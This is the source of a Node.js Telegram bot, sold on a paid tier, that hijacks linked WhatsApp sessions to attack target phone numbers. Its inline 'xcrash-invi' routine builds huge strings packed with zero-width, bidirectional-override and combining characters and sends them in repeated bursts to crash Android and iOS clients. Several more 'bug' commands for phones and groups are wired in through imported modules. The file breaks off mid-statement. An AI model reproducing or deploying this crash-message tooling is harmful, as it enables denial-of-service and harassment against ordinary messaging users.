process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');

const pino = require('pino');

console.clear();

// --- GLOBAL ERROR HANDLING ---
process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) fs.mkdirSync(LoveDir);

const { spawn } = require('child_process');
const activeBots = {};
const startTime = Date.now();
const LoveLogo = 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663950805814/hOyayfvukVhfTZRC.png';
const waSessions = {};
const unauthorized = Buffer.from('8J+aqyBZb3UgYXJlIG5vdCBhdXRob3JpemVkIHRvIHVzZSB0aGlzIGNvbW1hbmQu', 'base64').toString();

// SY Loves Here 🤗❤️‍🩹
const SYLoves = `./SY/S7/`;

// ===== ANDROID BUGS =====
// ===== INLINE xcrash-invi =====
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

function _buildAndroidDraft(seed = 0) {
    const ZWJ = '\u200D', VS16 = '\uFE0F', RTL = '\u202E', LTR = '\u202D';
    const unit = (ZWJ + VS16 + RTL + LTR).repeat(4);
    const base = 'x'.repeat(40000);
    return (base + unit.repeat(seed + 1)).repeat(2).slice(0, 120000);
}
function _buildIosDraft(seed = 0) {
    const combining = '\u0301\u0302\u0303\u0304\u0305\u0306\u0307';
    const base = 'a'.repeat(30000);
    return (base + combining.repeat(seed + 1)).repeat(3).slice(0, 100000);
}
async function _xRelay(client, jid, content) {
    const userJid = client?.user?.id || client?.authState?.creds?.me?.id;
    const waMsg = generateWAMessageFromContent(jid, content, { userJid });
    await client.relayMessage(jid, waMsg.message, { messageId: waMsg.key.id });
    return waMsg.key.id;
}
async function _xArm(client) {
    const ops = {
        updateLastSeenPrivacy: 'none', updateOnlinePrivacy: 'none',
        updateProfilePicturePrivacy: 'none', updateStatusPrivacy: 'none',
        updateReadReceiptsPrivacy: 'none', updateGroupsAddPrivacy: 'none',
        updateCallPrivacy: 'none',
    };
    let ok = 0;
    for (const [m, v] of Object.entries(ops)) {
        if (typeof client[m] !== 'function') continue;
        try { await client[m](v); ok++; } catch {}
    }
    return ok;
}
async function _xJid(client, targetJid) {
    try {
        const store = client?.signalRepository?.lidMapping;
        if (store && typeof store.getLIDForPN === 'function') {
            const lid = await store.getLIDForPN(targetJid);
            if (lid) return { jid: lid, mode: 'lid' };
        }
    } catch {}
    return { jid: targetJid, mode: 'pn' };
}
async function _xSend(client, jid, content) {
    try { await _xRelay(client, jid, content); return true; } catch { return false; }
}

const xcrashInviLogic = {
    async xcrashInvi(client, targetJid, options = {}) {
        const rounds = Number.isFinite(options.rounds) ? options.rounds : 4;
        const gapMs  = Number.isFinite(options.gapMs) ? options.gapMs : 1200;
        const useLid = options.useLid !== false;
        const arm    = options.arm !== false;

        const privacyArmed = arm ? await _xArm(client) : 0;
        const resolved = useLid ? await _xJid(client, targetJid) : { jid: targetJid, mode: 'pn' };
        const sendJid = resolved.jid;

        for (let r = 0; r < rounds; r++) {
            await _xSend(client, sendJid, {
                extendedTextMessage: {
                    text: _buildAndroidDraft(r),
                    contextInfo: { mentionedJid: [sendJid], conversionSource: 'draft' },
                },
            });
            await delay(gapMs);

            await _xSend(client, sendJid, {
                viewOnceMessage: { message: { extendedTextMessage: {
                    text: _buildAndroidDraft(r + 10),
                    contextInfo: { mentionedJid: [sendJid], conversionSource: 'viewonce' },
                }}},
            });
            await delay(gapMs);

            await _xSend(client, sendJid, {
                extendedTextMessage: {
                    text: _buildIosDraft(r),
                    contextInfo: { mentionedJid: [sendJid], conversionSource: 'ios' },
                },
            });
            await delay(gapMs);

            await _xSend(client, sendJid, {
                interactiveMessage: {
                    body: { text: _buildAndroidDraft(r + 20) },
                    nativeFlowMessage: { buttons: [{ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'OK', id: 'x' }) }] },
                },
            });
            await delay(gapMs);
        }

        return { jid: sendJid, mode: resolved.mode, rounds, privacyArmed };
    }
};
// ===== END INLINE xcrash-invi =====
console.log('[DEBUG] xcrash-invi exports:', Object.keys(xcrashInviLogic));
const shahxuJamLogic  = require(SYLoves + 'shahxu-jam');
const ghostdropLogic  = require(SYLoves + 'ghostdrop');

// ===== IOS BUGS =====
const iosdropLogic     = require(SYLoves + 'iosdrop');
const phantomdropLogic = require(SYLoves + 'phantomdrop');

// ===== GROUP =====
const groupdropLogic = require(SYLoves + 'groupdrop');

const colors = {
    reset: "\x1b[0m", gray: "\x1b[90m", blue: "\x1b[34m", green: "\x1b[32m",
    red: "\x1b[31m", magenta: "\x1b[35m", cyan: "\x1b[36m", yellow: "\x1b[33m"
};

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days}d ${hours}h ${minutes}m`;
}

function log(type, user, message) {
    const time = new Date().toLocaleTimeString();
    const timestamp = `${colors.gray}[${time}]${colors.reset}`;
    let typeTag = "";
    if (type === 'info') typeTag = `${colors.blue}INFO${colors.reset}`;
    if (type === 'success') typeTag = `${colors.green}SUCCESS${colors.reset}`;
    if (type === 'error') typeTag = `${colors.red}ERROR${colors.reset}`;
    if (type === 'command') typeTag = `${colors.magenta}CMD${colors.reset}`;
    const userTag = user ? `${colors.cyan}${user}${colors.reset}` : "SYSTEM";
    console.log(`${timestamp} | ${typeTag} | ${userTag} | ${message}`);
}

const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return { tokens: [], premium: [], resellers: [] };
    try {
        const content = fs.readFileSync(dbPath);
        const parsed = JSON.parse(content);
        if (Array.isArray(parsed)) return { tokens: parsed, premium: [], resellers: [] };
        return {
            state: typeof parsed.state === 'number' ? parsed.state : 0,
            tokens: parsed.tokens || [],
            premium: parsed.premium || [],
            resellers: parsed.resellers || []
        };
    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);
        return { tokens: [], premium: [], resellers: [] };
    }
};

const saveDB = (data) => {
    try {
        fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2));
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};

function sendSYLove(bot, chatId) {
    bot.sendMessage(
        chatId,
        `🚫 <b>You are not authorized to use this command.</b>\n\n` +
        `📩 Please contact the developer to buy: ${config.S7}\n\n` +
        `💰 <b>Price/Cost:</b>\n` +
        `✅ <b>Permanent Access</b>: 15$\n` +
        `✅ <b>Permanent Resell</b>: 30$\n` +
        `✅ <b>Script (No Encryption, 100%)</b>: 100$`,
        { parse_mode: 'HTML' }
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    if (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    ) {
        return true;
    }
    return false;
}

// --- GLOBAL SESSION POOL ---
function GetSessionForUser(userId, chatId) {
    let db = getDB();
    const isPremium = (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    );

    let eligibleSessions = [];

    if (isPremium) {
        Object.values(waSessions).forEach(sessions => {
            if (Array.isArray(sessions)) {
                sessions.forEach(s => eligibleSessions.push(s));
            }
        });
        if (eligibleSessions.length === 0) {
            return { error: '❌ No numbers connected in the system globally.' };
        }
        return eligibleSessions[Math.floor(Math.random() * eligibleSessions.length)];
    } else {
        if (!waSessions[chatId] || waSessions[chatId].length === 0) {
            return { error: '❌ No Number connected please use /reqpair to connect' };
        }
        return waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    }
}

// --- WhatsApp Connection Functions ---
async function StartLovingSY(chatId, number, S7) {
    const authPath = `./Love/auth/${chatId}/${number}`;
    const isNewLogin = !fs.existsSync(path.join(authPath, 'creds.json'));

    if (!fs.existsSync(authPath)) {
        fs.mkdirSync(authPath, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(authPath);
    const { version } = await fetchLatestBaileysVersion();
    log('info', 'WhatsApp', `Baileys version: ${version.join('.')}`);

    const SYxS7 = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(
                state.keys,
                pino({ level: 'fatal' }).child({ level: 'fatal' })
            ),
        },
        browser: ['Mac OS', 'Safari', '10.15.7'],
        markOnlineOnConnect: false,
        syncFullHistory: false,
        generateHighQualityLinkPreview: false,
    });

    let pairingRequested = false;

    SYxS7.ev.on('creds.update', saveCreds);

    SYxS7.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (connection === 'connecting' && !SYxS7.authState.creds.registered && !pairingRequested) {
            pairingRequested = true;
            await delay(1500);
            try {
                const cleanNum = number.replace(/[^0-9]/g, '');
                const code = await SYxS7.requestPairingCode(cleanNum, '2XBROBVG');
                const formatted = code?.match(/.{1,4}/g)?.join('-') || code;
                log('success', 'WhatsApp', `Pairing code for ${cleanNum}: ${formatted}`);
                await S7.sendMessage(
                    chatId,
                    `╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮\n` +
                    `│➻ Nᴜᴍʙᴇʀ : ${cleanNum}\n` +
                    `│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : <code>${formatted}</code>\n` +
                    `╰───────────────────────╯\n\n` +
                    `<b>How to use:</b>\n` +
                    `1. Open WhatsApp on that phone\n` +
                    `2. Settings → Linked Devices → Link a Device\n` +
                    `3. Tap "Link with phone number instead"\n` +
                    `4. Enter the code above`,
                    { parse_mode: 'HTML' }
                );
            } catch (err) {
                pairingRequested = false;
                log('error', 'WhatsApp', `Pairing code request failed: ${err.message}`);
                await S7.sendMessage(
                    chatId,
                    `❌ <b>Pairing Code Failed</b>\nNumber: ${number}\nReason: <code>${err.message}</code>`,
                    { parse_mode: 'HTML' }
                ).catch(() => {});
            }
        }

        if (connection === 'connecting') {
            log('info', 'WhatsApp', `Connecting: ${number}`);
        }

        if (connection === "open") {
            log('success', 'WhatsApp', `Connected: ${number}`);
            if (!waSessions[chatId]) waSessions[chatId] = [];
            waSessions[chatId].push({ sock: SYxS7, num: number });
            if (isNewLogin) {
                await S7.sendMessage(chatId, `✅ <b>WhatsApp Connected!</b>\nNumber: ${number}.`, { parse_mode: 'HTML' }).catch(() => {});
            }
        }
        if (connection === "close") {
            if (waSessions[chatId]) {
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            }

            let reason = lastDisconnect?.error?.output?.statusCode;
            log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);
            if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost) {
                log('info', 'WhatsApp', `Restarting/Reconnecting session for ${number}...`);
                StartLovingSY(chatId, number, S7);
            } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
                await S7.sendMessage(chatId, `❌ <b>WhatsApp Logged Out</b>\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, { parse_mode: 'HTML' }).catch(() => {});
                const SYPaTH = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, { recursive: true, force: true });
            } else if (
                reason === 405 ||
                reason === DisconnectReason.connectionClosed ||
                reason === DisconnectReason.timedOut
            ) {
                log('error', 'WhatsApp', `Connection closed for ${number}. Reconnecting in 5 seconds...`);
                setTimeout(() => StartLovingSY(chatId, number, S7).catch((err) => {
                    log('error', 'WhatsApp', `Reconnect failed for ${number}: ${err.message}`);
                }), 5000);
            } else {
                await S7.sendMessage(chatId, `⚠️ <b>Connection Closed</b>\nNumber: ${number}\nReason: ${reason}`, { parse_mode: 'HTML' }).catch(() => {});
            }
        }
    });
}

async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    StartLovingSY(chatId, number, S7);
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}

async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `❌ <b>Token Error</b>\n\n` +
                `Your bot token is not working.\n` +
                `Reason: <code>${errorMsg}</code>\n\n` +
                `Token has been removed automatically.`,
                { parse_mode: 'HTML' }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    if (love.toString() === config.adminId.toString()) return 'Owner';
    if (db.resellers.includes(love.toString())) return 'Reseller';
    if (db.premium.includes(love.toString())) return 'Premium';
    return 'Free User';
}

function MainSYLoVe(name, uptime, love) {
    const status = GetSYLoVe(love);
    return `┌──────┤ ${config.bot} ├──────┐\n│➻ Name: ${name}\n│➻ Status: ${status}\n│➻ Online: ${uptime}\n└──────────────────────┘`;
}

function bvgNotice(target, from, duration) {
    return (
        `┌──────┤ NOTIFICATION ├──────┐\n` +
        `│➻ sent bvg...\n` +
        `│➻ Target: ${target}\n` +
        `│➻ From: ${from}\n` +
        `│➻ Duration: ${duration}\n` +
        `└────────────────────────┘`
    );
}

// ==================== START BOT ====================
function startSYloveBot(token) {
    try {
        const S7 = new SY(token, { polling: true });
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
            log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);
            if (err.message.includes('404') || err.message.includes('401') || err.message.includes('Unauthorized')) {
                await S7Naverdead(token, err.message);
            }
        });

        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) commands = [commands];
            S7.on('message', (msg) => {
                if (!msg.text) return;
                const cmd = msg.text.trim().split(' ')[0].slice(1);
                if (commands.includes(cmd)) {
                    try {
                        const name = msg.from.first_name || msg.from.username || "Unknown";
                        log('command', name, msg.text);
                        callback(msg);
                    } catch (err) {
                        log('error', 'COMMAND_EXEC', err.message);
                        S7.sendMessage(msg.chat.id, 'An internal error occurred.');
                    }
                }
            });
        }

        // ==================== COMMANDS ====================

        // --- Start / Menu ---
        SYLoVe(['start', 'menu'], (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();

            const userFile = path.join(LoveDir, 'user.json');
            let users = [];
            if (fs.existsSync(userFile)) users = JSON.parse(fs.readFileSync(userFile));

            const userExists = users.find(u => u.id === chatId);
            if (!userExists) {
                users.push({ id: chatId, name: name, date: new Date().toLocaleString() });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }
            const love = msg.from.id.toString();

            const captionText = MainSYLoVe(name, uptime, love) + `
┌──────┤ Press Button Menu ├──────┐
└────────────────────────┘`;

            const menuButtons = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'I|  Bug Menu', callback_data: 'bug_menu' }, { text: 'I|  Misc Menu', callback_data: 'misc_menu' }],
                        [{ text: 'I|  Channel ↗', url: `${config.channel}` }],
                        [{ text: 'I|  Group ↗', url: `${config.group}` }]
                    ]
                }
            };

            S7.sendPhoto(chatId, LoveLogo, {
                caption: captionText,
                ...menuButtons
            }).catch((err) => {
                log('error', 'START_PHOTO', err.message);
                S7.sendMessage(chatId, captionText, menuButtons);
            });
        });

        // ==================== CALLBACK QUERY HANDLER ====================
        S7.on('callback_query', async (query) => {
            try { await S7.answerCallbackQuery(query.id); } catch {}

            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
            const uptime = getRuntime();
            const userId = query.from.id.toString();

            const safeEdit = async (text, keyboard) => {
                const opts = {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: keyboard }
                };
                const hasCaption = !!(query.message.caption || query.message.photo);
                try {
                    if (hasCaption) await S7.editMessageCaption(text, opts);
                    else await S7.editMessageText(text, opts);
                } catch (err) {
                    try { await S7.editMessageText(text, opts); }
                    catch (err2) { log('error', 'CALLBACK_EDIT', err2.message); }
                }
            };

            try {
                if (!LoveGlobalState(userId)) {
                    await S7.answerCallbackQuery(query.id, { text: '⛔ You are not authorized!', show_alert: true });
                    return sendSYLove(S7, chatId);
                }

                const mainMenuKb = [
                    [{ text: 'I|  Bug Menu', callback_data: 'bug_menu' }, { text: 'I|  Misc Menu', callback_data: 'misc_menu' }],
                    [{ text: 'I|  Channel ↗', url: `${config.channel}` }],
                    [{ text: 'I|  Group ↗', url: `${config.group}` }]
                ];

                if (data === 'main_menu') {
                    await safeEdit(
                        MainSYLoVe(name, uptime, userId) + `\n┌──────┤ Press Button Menu ├──────┐\n└────────────────────────┘`,
                        mainMenuKb
                    );
                }
                else if (data === 'bug_menu') {
                    await safeEdit(
                        MainSYLoVe(name, uptime, userId) + `\n┌──────┤ BUG MENU ├──────┐\n│ Select your platform\n└──────────────────────┘`,
                        [
                            [{ text: 'I| 𝖠𝗇𝖽𝗋𝗈𝗂𝖽 𝖡𝗎𝗀𝗌', callback_data: 'android_menu' }],
                            [{ text: 'I| 𝖨𝗈𝗌 𝖡𝗎𝗀𝗌', callback_data: 'ios_menu' }],
                            [{ text: 'I| 𝖦𝗋𝗈𝗎𝗉 𝖡𝗎𝗀𝗌', callback_data: 'group_menu' }],
                            [{ text: 'I| 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖬𝖺𝗂𝗇', callback_data: 'main_menu' }]
                        ]
                    );
                }
                else if (data === 'android_menu') {
                    await safeEdit(
                        MainSYLoVe(name, uptime, userId) + `
┌──────┤ 𝖠𝖭𝖣𝖱𝖮𝖨𝖣 𝖡𝖴𝖦𝖲 ├──────┐
│➻ /xcrash-invi [num]
│➻ /shahxu-jam  [num]
│➻ /ghostdrop   [num]
└──────────────────────┘`,
                        [[{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]]
                    );
                }
                else if (data === 'ios_menu') {
                    await safeEdit(
                        MainSYLoVe(name, uptime, userId) + `
┌──────┤ 𝖨𝖮𝖲 𝖡𝖴𝖦𝖲 ├──────┐
│➻ /iosdrop     [num]
│➻ /phantomdrop [num]
└──────────────────────┘`,
                        [[{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]]
                    );
                }
                else if (data === 'group_menu') {
                    await safeEdit(
                        MainSYLoVe(name, uptime, userId) + `
┌──────┤ 𝖦𝖱𝖮𝖴𝖯 𝖡𝖴𝖦𝖲 ├──────┐
│➻ /groupdrop [group_id]@g.us
│➻ /listgc
│➻ /groupid [link]
└──────────────────────┘`,
                        [[{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎', callback_data: 'bug_menu' }]]
                    );
                }
                else if (data === 'misc_menu') {
                    await safeEdit(
                        MainSYLoVe(name, uptime, userId) + `
┌──────┤ 𝖬𝖨𝖲𝖢 𝖬𝖤𝖭𝖴 ├──────┐
│➻ /reqpair [number]
│➻ /delpair [number]
│➻ /addprem [ID]
│➻ /delprem [ID]
│➻ /addresell [ID]
│➻ /delresell [ID]
│➻ /addtoken [token]
│➻ /deltoken [token]
│➻ /listprem
│➻ /listresell
│➻ /listuser
│➻ /mytoken
│➻ /state [0|1]
│➻ /broadcast [message]
└──────────────────────┘`,
                        [[{ text: '◀️ 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖬𝖺𝗂𝗇', callback_data: 'main_menu' }]]
                    );
                }
            } catch (err) {
                log('error', 'CALLBACK', err.message);
            }
        });

        // ============================================================
        // NEW ANDROID BUG COMMANDS
        // ============================================================

        // /xcrash-invi [num]
        SYLoVe(['xcrash-invi', 'xcrashinvi', 'xinvi'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const cmd = args[0].slice(1);
            const targetNum = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, {
                    caption: bvgNotice(cleanTarget, session.num, 'invisible · no-time'),
                    parse_mode: 'HTML'
                });

                const res = await xcrashInviLogic.xcrashInvi(client, targetJid, {
                    rounds: 3, gapMs: 900, arm: true, useLid: true,
                });

                S7.sendMessage(chatId,
                    `✅ <b>XCRASH-INVI DONE</b>\n` +
                    `Target: <code>${cleanTarget}</code>\n` +
                    `Routing: <b>${res.mode.toUpperCase()}</b>\n` +
                    `Privacy: <b>${res.privacyArmed}/7</b>`,
                    { parse_mode: 'HTML' }
                );
            } catch (err) {
                log('error', cmd, err.message);
                S7.sendMessage(chatId, `❌ ${err.message}`);
            }
        });

        // /shahxu-jam [num]
        SYLoVe(['shahxu-jam', 'shahxujam', 'sjam'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const cmd = args[0].slice(1);
            const targetNum = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, {
                    caption: bvgNotice(cleanTarget, session.num, 'jam · no-time'),
                    parse_mode: 'HTML'
                });

                const report = await shahxuJamLogic.shahxuJam(client, targetJid, {
                    rounds: 3, gapMs: 600, arm: true, useLid: true,
                });

                const layerSummary = Object.entries(report.layers)
                    .filter(([k]) => !k.endsWith('_fail'))
                    .map(([k, v]) => `${k}:${v}`)
                    .join(' · ');

                S7.sendMessage(chatId,
                    `✅ <b>SHAHXU-JAM DONE</b>\n` +
                    `Target: <code>${cleanTarget}</code>\n` +
                    `Routing: <b>${report.mode.toUpperCase()}</b>\n` +
                    `Privacy: <b>${report.privacyArmed}/7</b>\n` +
                    `Layers: <code>${layerSummary}</code>`,
                    { parse_mode: 'HTML' }
                );
            } catch (err) {
                log('error', cmd, err.message);
                S7.sendMessage(chatId, `❌ ${err.message}`);
            }
        });

        // /ghostdrop [num]
        SYLoVe(['ghostdrop', 'gdrop', 'ghost'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const cmd = args[0].slice(1);
            const targetNum = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, {
                    caption: bvgNotice(cleanTarget, session.num, 'invisible · no-time'),
                    parse_mode: 'HTML'
                });

                const report = await ghostdropLogic.ghostDrop(client, targetJid, {
                    bursts: 3, gapMs: 500, useLid: true,
                });

                const summary = Object.entries(report.channels)
                    .map(([k, v]) => `${k}:${v}`)
                    .join(' · ');

                S7.sendMessage(chatId,
                    `✅ <b>GHOSTDROP DONE</b>\n` +
                    `Target: <code>${cleanTarget}</code>\n` +
                    `Bursts: <b>${report.bursts}</b>\n` +
                    `Channels: <code>${summary}</code>`,
                    { parse_mode: 'HTML' }
                );
            } catch (err) {
                log('error', cmd, err.message);
                S7.sendMessage(chatId, `❌ ${err.message}`);
            }
        });

        // ============================================================
        // NEW IOS BUG COMMANDS
        // ============================================================

        // /iosdrop [num]
        SYLoVe(['iosdrop', 'idrop', 'ioskill'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const cmd = args[0].slice(1);
            const targetNum = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, {
                    caption: bvgNotice(cleanTarget, session.num, 'ios-drop · no-time'),
                    parse_mode: 'HTML'
                });

                const report = await iosdropLogic.iosDrop(client, targetJid, {
                    bursts: 3, gapMs: 800, useLid: true,
                });

                const summary = Object.entries(report.vectors)
                    .map(([k, v]) => `${k}:${v}`)
                    .join(' · ');

                S7.sendMessage(chatId,
                    `✅ <b>IOSDROP DONE</b>\n` +
                    `Target: <code>${cleanTarget}</code>\n` +
                    `Bursts: <b>${report.bursts}</b>\n` +
                    `Vectors: <code>${summary}</code>`,
                    { parse_mode: 'HTML' }
                );
            } catch (err) {
                log('error', cmd, err.message);
                S7.sendMessage(chatId, `❌ ${err.message}`);
            }
        });

        // /phantomdrop [num]
        SYLoVe(['phantomdrop', 'pd', 'phantom'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const cmd = args[0].slice(1);
            const targetNum = args[1];

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            const session = GetSessionForUser(userId, chatId);
            if (session.error) return S7.sendMessage(chatId, session.error);
            const client = session.sock;

            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /${cmd} +923XXXXXXXXX`);

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                log('command', msg.from.first_name, `${cmd} → ${cleanTarget}`);
                await S7.sendPhoto(chatId, LoveLogo, {
                    caption: bvgNotice(cleanTarget, session.num, 'phantom · no-time'),
                    parse_mode: 'HTML'
                });

                const report = await phantomdropLogic.phantomDrop(client, targetJid, {
                    bursts: 3, gapMs: 700, arm: true, useLid: true,
                });

                const summary = Object.entries(report.vectors)
                    .map(([k, v]) => `${k}:${v}`)
                    .join(' · ');

                S7.sendMessage(chatId,
                    `✅ <b>PHANTOMDROP DONE</b>\n` +
                    `Target: <code>${cleanTarget}</code>\n` +
                    `Bursts: <b>${report.bursts}</b>\n` +
                    `Privacy: <b>${report.privacyArmed}/7</b>\n` +
                    `Disappearing: <b>${report.disappearing ? 'ON (1s)' : 'OFF'}</b>\n` +
